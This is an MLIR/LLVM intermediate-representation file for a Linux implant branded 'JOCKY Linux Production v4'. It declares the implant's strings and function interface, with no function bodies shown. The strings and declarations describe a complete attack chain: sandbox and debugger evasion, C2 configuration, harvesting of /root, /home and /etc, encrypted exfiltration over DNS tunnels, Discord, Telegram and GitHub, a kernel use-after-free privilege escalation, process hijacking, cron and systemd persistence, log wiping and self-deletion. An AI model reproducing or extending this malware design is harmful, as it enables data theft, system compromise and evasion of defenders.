module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr<270> = dense<32> : vector<4xi64>, !llvm.ptr<271> = dense<32> : vector<4xi64>, !llvm.ptr<272> = dense<64> : vector<4xi64>, i64 = dense<64> : vector<2xi64>, f80 = dense<128> : vector<2xi64>, !llvm.ptr = dense<64> : vector<4xi64>, i1 = dense<8> : vector<2xi64>, i8 = dense<8> : vector<2xi64>, i16 = dense<16> : vector<2xi64>, i32 = dense<32> : vector<2xi64>, f16 = dense<16> : vector<2xi64>, f64 = dense<64> : vector<2xi64>, f128 = dense<128> : vector<2xi64>, "dlti.endianness" = "little", "dlti.mangling_mode" = "e", "dlti.legal_int_widths" = array<i32: 8, 16, 32, 64>, "dlti.stack_alignment" = 128 : i64>, llvm.module_asm = [], llvm.target_triple = "x86_64-unknown-linux-gnu"} {
  llvm.mlir.global private constant @".str.0"("[*] Phase 0: Anti-Analysis Detection\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.1"("    [!] Debugger detected - aborting\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.2"("    [+] Debugger check passed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.3"("    [!] VM detected - adjusting behavior\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.4"("    [!] Sandbox detected - adjusting\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.5"("[+] Anti-analysis phase complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.6"(dense<0> : tensor<1xi8>) {addr_space = 0 : i32, dso_local} : !llvm.array<1 x i8>
  llvm.mlir.global private constant @".str.7"("[*] Phase 1: C2 Bootstrap & Configuration\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.8"("http://localhost:8443/api/config\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.9"("    [+] PRIMARY C2 responded\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.10"("    [-] Fallback to hardcoded config\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.11"("Bearer_linux_production_v4\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.12"("/tmp/.jocky_model\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.13"("[*] Phase 2: Model Download & Caching\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.14"("    [+] Model cached: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.15"(" bytes\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.16"("    [*] Downloading model...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.17"("http://localhost:9000/models\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.18"("/\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.19"("phi-3-mini-4k-instruct.gguf\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.20"("    [+] Model downloaded to \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.21"("    [-] Model download failed (non-critical)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.22"("[*] Phase 3: Data Discovery & Inventory\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.23"("    [+] Found: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.24"("[+] Discovered \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.25"(" data targets\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.26"("[*] Phase 4: Data Collection (6 Sources)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.27"("/root\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.28"("    [+] /root: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.29"("/home\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.30"("    [+] /home: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.31"("/etc\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.32"("    [+] /etc: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.33"("/var/www\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.34"("    [+] /var/www: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.35"("/opt\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.36"("    [+] /opt: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.37"("/srv\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.38"("    [+] /srv: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.39"("[+] Data Collection: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.40"(" bytes from 6 sources\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.41"("[*] Phase 5: Data Encryption & Encoding\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.42"("    [+] XOR encryption applied\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.43"("key123\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.44"("    [+] RC4 encryption applied\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.45"("    [+] Data compressed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.46"("    [+] Base64 encoded: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.47"("[*] Phase 6: Exfiltration (5 Channels)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.48"("    [!] No data to exfiltrate\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.49"("http://localhost:9000/upload\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.50"("POST\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.51"("    [+] CDN exfiltration successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.52"("    [+] DNS tunnel exfiltration successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.53"("    [+] Discord exfiltration successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.54"("    [+] GitHub exfiltration successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.55"("JOCKY\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.56"("    [+] Telegram exfiltration successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.57"("[+] Multi-channel exfiltration complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.58"("[*] Phase 7: Kernel Exploitation (15 Techniques)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.59"("    [+] kFence detected!\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.60"("    [+] Pool info retrieved\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.61"("    [+] Spray phase complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.62"("    [+] Trigger phase complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.63"("    [+] Spray verification passed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.64"("    [+] UAF exploitation successful!\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.65"("    [+] Credential manipulation successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.66"("    [+] ROOT ACHIEVED via FENCE2PWN!\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.67"("    [*] LKM loading fallback...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.68"("    [+] Found kernel module path: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.69"("exploit_module\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.70"("    [+] Kernel module loaded successfully\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.71"("exploit_handler\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.72"("    [+] Found exploit handler symbol\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.73"("    [*] eBPF program loading...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.74"("    [*] Loading eBPF program: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.75"("    [+] eBPF program loaded (fd: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.76"(")\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.77"("    [+] eBPF attached successfully\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.78"("[-] Kernel exploitation incomplete (expected in analysis environment)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.79"("[*] Phase 8: Process Hijacking & Thread Control\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.80"("    [+] Attached to process (PID: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.81"("    [+] Retrieved process memory maps\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.82"("    [+] Thread hijacking successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.83"("    [+] Retrieved thread information\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.84"("[+] Process hijacking complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.85"("[-] Process attachment failed (expected in analysis environment)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.86"("[*] Phase 9: Dynamic Module Operations\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.87"("/lib64/libc.so.6\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.88"("    [+] libc module loaded successfully\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.89"("malloc\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.90"("    [+] Symbol 'malloc' found\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.91"("    [+] Module base retrieved\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.92"("    [+] Resolved symbol address: malloc\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.93"("    [+] Retrieved module information\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.94"("[+] Module operations complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.95"("[-] Module operations failed (expected in analysis environment)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.96"("[*] Phase 10: Persistence & Anti-Forensics (12 Techniques)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.97"("/usr/local/bin/jocky_service\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.98"("*/5 * * * *\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.99"("    [+] Cron persistence installed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.100"("jocky-service\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.101"("    [+] Systemd persistence installed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.102"("    [+] Bash history cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.103"("    [+] Syslog cleaned\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.104"("    [+] Journal cleaned\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.105"("    [+] Audit logs cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.106"("    [+] wtmp/btmp cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.107"("    [+] Lastlog cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.108"("/tmp\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.109"("/var/tmp\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.110"("    [+] Temporary files wiped\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.111"("    [+] DNS cache cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.112"("    [+] ARP cache flushed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.113"("    [+] User artifacts wiped\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.114"("[+] Persistence & anti-forensics complete: 12 techniques deployed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.115"("[*] Phase 11: Self-Deletion Protocol\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.116"("jocky_service\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.117"("    [+] Cron job removed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.118"("    [+] Systemd service removed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.119"("    [*] Initiating self-deletion...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.120"("[+] Binary removed from disk\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.121"("\E2\95\94\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\97\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.122"("\E2\95\91 JOCKY Linux Production v4 - Full Capability               \E2\95\91\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.123"("\E2\95\91 50+ Runtime APIs | Kernel Exploitation | Auto-Cleanup    \E2\95\91\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.124"("\E2\95\9A\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\9D\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.125"("[*] Build: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.126"("JOCKY_LINUX_PRODUCTION_V4_FULL\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.127"("[*] APIs Used: 50+ across 11 phases\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.128"("[+] Execution complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.129"("[*] Exfiltrated: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.130"("[*] Root Achieved: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.131"("[*] Kernel Access: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.132"("[*] Persistence: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global external @C2_PRIMARY() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @C2_FALLBACK() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @CDN_ENDPOINT() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @MODEL_REPO() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @MODEL_FILE() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @LOCAL_MODEL_PATH() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @BUILD_ID() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @DATA_PATHS() {addr_space = 0 : i32} : !llvm.array<6 x ptr> {
    %0 = llvm.mlir.zero : !llvm.ptr
    %1 = llvm.mlir.undef : !llvm.array<6 x ptr>
    %2 = llvm.insertvalue %0, %1[0] : !llvm.array<6 x ptr> 
    %3 = llvm.insertvalue %0, %2[1] : !llvm.array<6 x ptr> 
    %4 = llvm.insertvalue %0, %3[2] : !llvm.array<6 x ptr> 
    %5 = llvm.insertvalue %0, %4[3] : !llvm.array<6 x ptr> 
    %6 = llvm.insertvalue %0, %5[4] : !llvm.array<6 x ptr> 
    %7 = llvm.insertvalue %0, %6[5] : !llvm.array<6 x ptr> 
    llvm.return %7 : !llvm.array<6 x ptr>
  }
  llvm.mlir.global external @LKM_PATHS() {addr_space = 0 : i32} : !llvm.array<3 x ptr> {
    %0 = llvm.mlir.zero : !llvm.ptr
    %1 = llvm.mlir.undef : !llvm.array<3 x ptr>
    %2 = llvm.insertvalue %0, %1[0] : !llvm.array<3 x ptr> 
    %3 = llvm.insertvalue %0, %2[1] : !llvm.array<3 x ptr> 
    %4 = llvm.insertvalue %0, %3[2] : !llvm.array<3 x ptr> 
    llvm.return %4 : !llvm.array<3 x ptr>
  }
  llvm.mlir.global external @EBPF_PROGRAMS() {addr_space = 0 : i32} : !llvm.array<4 x ptr> {
    %0 = llvm.mlir.zero : !llvm.ptr
    %1 = llvm.mlir.undef : !llvm.array<4 x ptr>
    %2 = llvm.insertvalue %0, %1[0] : !llvm.array<4 x ptr> 
    %3 = llvm.insertvalue %0, %2[1] : !llvm.array<4 x ptr> 
    %4 = llvm.insertvalue %0, %3[2] : !llvm.array<4 x ptr> 
    %5 = llvm.insertvalue %0, %4[3] : !llvm.array<4 x ptr> 
    llvm.return %5 : !llvm.array<4 x ptr>
  }
  llvm.mlir.global external @cdn_token() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @model_path() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @collected_data() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @root_achieved(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @kernel_access(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @persistence_set(false) {addr_space = 0 : i32} : i1
  llvm.func @puts(!llvm.ptr) -> i32
  llvm.func @printf(!llvm.ptr, ...) -> i32
  llvm.func @println(!llvm.ptr)
  llvm.func @string(i64) -> !llvm.ptr
  llvm.func @jocky_str_concat(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @malloc(i64) -> !llvm.ptr
  llvm.func @free(!llvm.ptr)
  llvm.func @memset(!llvm.ptr, i32, i64) -> !llvm.ptr
  llvm.func @memcpy(!llvm.ptr, !llvm.ptr, i64) -> !llvm.ptr
  llvm.func @strlen(!llvm.ptr) -> i64
  llvm.func @exit(i32)
  llvm.func @array_len(!llvm.ptr) -> i64
  llvm.func @array_append(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_alloc(i64) -> !llvm.ptr
  llvm.func @jocky_free(!llvm.ptr)
  llvm.func @jocky_byovd_new() -> !llvm.ptr
  llvm.func @jocky_byovd_destroy(!llvm.ptr)
  llvm.func @jocky_runtime_init() -> i32
  llvm.func @jocky_check_analysis_environment() -> i32
  llvm.func @jocky_is_debugger_present() -> i1
  llvm.func @jocky_is_vm() -> i1
  llvm.func @jocky_is_sandbox() -> i1
  llvm.func @jocky_sleep_and_recheck()
  llvm.func @jocky_decrypt_xor(!llvm.ptr, i32, i8, i32)
  llvm.func @jocky_decrypt_rc4(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_unhook_ntdll() -> i1
  llvm.func @jocky_unhook_kernel32() -> i1
  llvm.func @jocky_enable_direct_syscalls() -> i1
  llvm.func @jocky_disable_ob_callbacks() -> i1
  llvm.func @jocky_disable_minifilter_callbacks() -> i1
  llvm.func @jocky_disable_wdfilter() -> i1
  llvm.func @jocky_patch_etw_provider() -> i1
  llvm.func @jocky_spoof_process_name(!llvm.ptr) -> i1
  llvm.func @jocky_hide_from_usermode() -> i1
  llvm.func @jocky_disable_etw(!llvm.ptr) -> i1
  llvm.func @jocky_disable_edr_callbacks(!llvm.ptr) -> i32
  llvm.func @jocky_get_syscall_number(!llvm.ptr) -> i32
  llvm.func @jocky_spoof_call(!llvm.ptr, i64, i64, i64, i64) -> i64
  llvm.func @jocky_spoof_syscall(i32, i64, i64, i64, i64) -> i64
  llvm.func @jocky_byovd_load(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_byovd_unload(!llvm.ptr)
  llvm.func @jocky_driver_read_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_write_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_map_kernel(!llvm.ptr, i64, i32) -> !llvm.ptr
  llvm.func @jocky_kread(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_kwrite(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_elevate_token(!llvm.ptr, i32) -> i1
  llvm.func @jocky_process_hollow(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_module_stomp(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_rdll_inject(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_thread_hijack(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_encrypt(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_exfil_front(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_dns(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_discord(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_telegram(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_github(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_self_delete()
  llvm.func @jocky_clear_logs()
  llvm.func @jocky_wipe_artifacts(!llvm.ptr)
  llvm.func @jocky_wipe_prefetch()
  llvm.func @jocky_patch_shimcache() -> i1
  llvm.func @jocky_patch_amcache() -> i1
  llvm.func @jocky_clear_srum() -> i1
  llvm.func @jocky_cleanup_all()
  llvm.func @forensics_wipe_powershell_history() -> i32
  llvm.func @forensics_wipe_cmd_history() -> i32
  llvm.func @forensics_flush_arp_cache() -> i32
  llvm.func @forensics_clear_dns_cache() -> i32
  llvm.func @linux_forensics_wipe_bash_history() -> i32
  llvm.func @jocky_linux_cleanup_syslog() -> i32
  llvm.func @jocky_linux_cleanup_journal() -> i32
  llvm.func @jocky_cleanup_event_logs(!llvm.ptr) -> i32
  llvm.func @jocky_cleanup_usn_journal() -> i32
  llvm.func @fs_exists(!llvm.ptr) -> i1
  llvm.func @fs_list_files(!llvm.ptr, i1) -> !llvm.ptr
  llvm.func @fs_file_size(!llvm.ptr) -> i64
  llvm.func @fs_read_file(!llvm.ptr) -> !llvm.ptr
  llvm.func @fs_write_file(!llvm.ptr, !llvm.ptr, i64) -> i1
  llvm.func @crypto_generate_key(i32) -> !llvm.ptr
  llvm.func @crypto_aes256_encrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @crypto_aes256_decrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @sandbox_spawn(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @sandbox_set_limits(i32, i64, i32, i64) -> i1
  llvm.func @sandbox_monitor(i32) -> i32
  llvm.func @sandbox_wait(i32) -> i32
  llvm.func @sandbox_export_trace(i32, !llvm.ptr) -> i1
  llvm.func @jocky_registry_create_key(i32, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_registry_set_value(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32) -> i1
  llvm.func @jocky_registry_close_key(!llvm.ptr) -> i1
  llvm.func @audit_log(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @audit_init(i32) -> i1
  llvm.func @audit_export(!llvm.ptr) -> i1
  llvm.func @audit_verify() -> i32
  llvm.func @provenance_record(!llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @ai_init() -> i32
  llvm.func @ai_collect_telemetry() -> !llvm.ptr
  llvm.func @ai_score_threat() -> f64
  llvm.func @byovd_load_driver(!llvm.ptr) -> i32
  llvm.func @byovd_test_exploit(i32) -> i32
  llvm.func @btr_disable_notifications() -> i1
  llvm.func @btr_mask_module(!llvm.ptr) -> i1
  llvm.func @jocky_exploit_disable_callbacks() -> i32
  llvm.func @jocky_exploit_token_replacement(i32, i32) -> i32
  llvm.func @edrhoker_detect() -> i1
  llvm.func @blindside_unhook_ntdll() -> i1
  llvm.func @exfil_dns_tunnel(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_discord_webhook(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_local_cdn(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_module_load(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_module_unload(!llvm.ptr) -> i1
  llvm.func @jocky_module_has_symbol(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_module_base(!llvm.ptr) -> i64
  llvm.func @jocky_module_resolve_symbol(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_process_hollow_linux(i32, !llvm.ptr, i64) -> i1
  llvm.func @jocky_process_ptrace_attach(i32) -> i32
  llvm.func @jocky_process_ptrace_detach(i32) -> i32
  llvm.func @jocky_process_get_maps(i32, !llvm.ptr, i64) -> i32
  llvm.func @jocky_fence2pwn_detect_kfence() -> i32
  llvm.func @jocky_fence2pwn_get_pool_info(!llvm.ptr) -> i32
  llvm.func @jocky_fence2pwn_trigger_allocations(i64, i32) -> i32
  llvm.func @jocky_fence2pwn_exploit_uaf(i32, i32, !llvm.ptr) -> i32
  llvm.func @jocky_fence2pwn_manipulate_creds(i32, i32) -> i32
  llvm.func @jocky_fence2pwn_allocate_cred_objects(i32) -> i32
  llvm.func @jocky_fence2pwn_write_cred(!llvm.ptr, i32, i32) -> i32
  llvm.func @jocky_fence2pwn_trigger_reclamation() -> i32
  llvm.func @jocky_fence2pwn_elevate_to_root() -> i32
  llvm.func @jocky_fence2pwn_find_uaf_primitive() -> i32
  llvm.func @jocky_ebpf_load(!llvm.ptr, i32, i32) -> i32
  llvm.func @jocky_ebpf_attach(i32, i32, i32) -> i32
  llvm.func @jocky_ebpf_run(i32, !llvm.ptr, i32) -> i64
  llvm.func @jocky_lkm_load(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_lkm_unload(!llvm.ptr) -> i32
  llvm.func @jocky_lkm_get_symbol(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_syscall_hook(i32, !llvm.ptr) -> i32
  llvm.func @jocky_syscall_unhook(i32) -> i32
  llvm.func @jocky_syscall_trace(i32) -> i32
